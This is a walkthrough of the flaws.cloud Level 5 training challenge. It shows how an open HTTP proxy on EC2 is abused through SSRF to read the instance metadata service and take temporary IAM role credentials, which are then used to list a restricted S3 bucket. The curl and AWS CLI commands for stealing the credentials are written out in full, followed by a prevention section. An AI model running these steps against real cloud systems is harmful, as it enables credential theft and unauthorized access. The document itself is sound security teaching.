# Level 5 — SSRF / EC2 Metadata

## 🎯 Objective

> This level has an EC2 instance with a simple HTTP proxy. We need to use the proxy to list the contents of the Level 6 S3 bucket and find its hidden directory.

The main goal is to use the proxy to access the EC2 instance's metadata service, retrieve the IAM role credentials attached to the instance, and use those credentials to access the Level 6 bucket.

---

## 🧠 What I Learned

* A web server acting as a proxy can potentially be abused for **Server-Side Request Forgery (SSRF)**.
* EC2 instances have an **Instance Metadata Service (IMDS)** that provides information about the instance.
* The metadata service can contain temporary credentials for an IAM role attached to an EC2 instance.
* An attacker who can access these credentials may be able to act with the permissions of the EC2 instance's IAM role.
* IAM roles and IAM users are different. An EC2 instance can assume a role and receive temporary credentials.
* The metadata service is available through the link-local address `169.254.169.254`.
* Temporary AWS credentials contain an access key, secret access key, and session token.

---

## 🔎 Findings

### Finding 1

The Level 5 page tells us that an EC2 instance is running a simple HTTP proxy.

The proxy allows us to make requests through the EC2 server instead of making them directly from our own machine.

This is important because the EC2 instance can access resources that our machine cannot, including the EC2 Instance Metadata Service.

### Finding 2

The EC2 Instance Metadata Service is available at:

```text
169.254.169.254
```

Because the proxy makes requests from inside the EC2 environment, we can use it to request the metadata service.

This creates an **SSRF vulnerability** because we are effectively making the server send a request to an internal resource on our behalf.

---

## 💥 Exploitation

### Step 1

We first examine the proxy to understand how it works.

```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/
```

The proxy retrieves the requested website for us.

This confirms that the server is making the HTTP request instead of our own machine.

---

### Step 2

We can now try requesting the EC2 metadata service through the proxy.

```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/
```

The response shows metadata belonging to the EC2 instance.

This is significant because `169.254.169.254` is not a normal public website. It is a link-local address used by the EC2 instance to access its metadata.

---

### Step 3

We can inspect the metadata paths to find information about the IAM role attached to the instance.

```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/
```

We can then look for the IAM security credentials:

```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/
```

This reveals the IAM role:

```text
flaws
```

---

### Step 4

We can request the credentials associated with the `flaws` role.

```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
```

The response contains temporary AWS credentials, including:

```text
AccessKeyId
SecretAccessKey
Token
Expiration
```

These credentials belong to the IAM role attached to the EC2 instance.

---

### Step 5

Because these are temporary role credentials, they include a session token.

We can create a new AWS CLI profile using the credentials.

```bash
aws configure --profile level5
```

For the session token, we need to add:

```text
aws_session_token = [TOKEN]
```

to the profile.

We can then verify which identity the credentials belong to:

```bash
aws sts get-caller-identity --profile level5
```

The result confirms that we are operating as the `flaws` IAM role rather than as our original IAM user.

---

### Step 6

The Level 5 instructions tell us that the Level 6 S3 bucket contains a hidden directory.

We can use our new credentials to list the bucket:

```bash
aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile level5
```

The bucket contains a hidden directory:

```text
ddcc78ff/
```

---

### Step 7

We can access the hidden directory through the Level 6 website:

```text
http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
```

This takes us to **Level 6**.

---

## 🏁 Solution

The main vulnerability in this level was the exposed HTTP proxy.

The proxy allowed us to make requests from the EC2 instance to internal resources. We abused this behavior to access the **EC2 Instance Metadata Service** at `169.254.169.254`.

The metadata service exposed the IAM role attached to the EC2 instance and temporary credentials for that role.

We then used those credentials with the AWS CLI to access the Level 6 S3 bucket and discovered its hidden directory:

```text
ddcc78ff/
```

This gave us access to Level 6.

---

## 🛡️ Security Lesson

### Vulnerability / Misconfiguration

**Server-Side Request Forgery (SSRF) allowing access to EC2 Instance Metadata**

The web proxy did not properly restrict which destinations it could request. This allowed an attacker to make the EC2 instance request its own metadata service.

The metadata service then exposed temporary credentials belonging to the EC2 instance's IAM role.

### Why it matters

If an application is vulnerable to SSRF and can reach the EC2 metadata service, an attacker may be able to obtain temporary AWS credentials.

Those credentials can then be used to access AWS resources according to the permissions of the attached IAM role.

The impact therefore depends heavily on the permissions granted to the role.

### How it could be prevented

* Protect applications against SSRF.
* Restrict proxy destinations using an allowlist where possible.
* Avoid allowing user-controlled URLs to access internal services.
* Use **IMDSv2** rather than relying on IMDSv1.
* Apply least-privilege permissions to EC2 IAM roles.
* Monitor and alert on unusual access to instance metadata.
* Avoid giving EC2 roles permissions that are unnecessary for the application.

---

## 📝 Key Takeaways

* **AWS service:** EC2 / Instance Metadata Service / IAM / S3
* **Vulnerability:** SSRF
* **Important IP:** `169.254.169.254`
* **Security concept:** Instance metadata and temporary IAM role credentials
* **Main lesson:** An SSRF vulnerability can become much more serious in a cloud environment because it may provide access to internal metadata and temporary cloud credentials.
* **Practical lesson:** EC2 IAM roles should always follow least privilege, and applications should not be able to freely make requests to internal services.

---

## 🔗 References

* [flaws.cloud](http://flaws.cloud/)
* [AWS EC2 Instance Metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
* [AWS IAM Roles for Amazon EC2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html)
* [AWS EBS Encryption](https://docs.aws.amazon.com/ebs/latest/userguide/ebs-encryption.html)
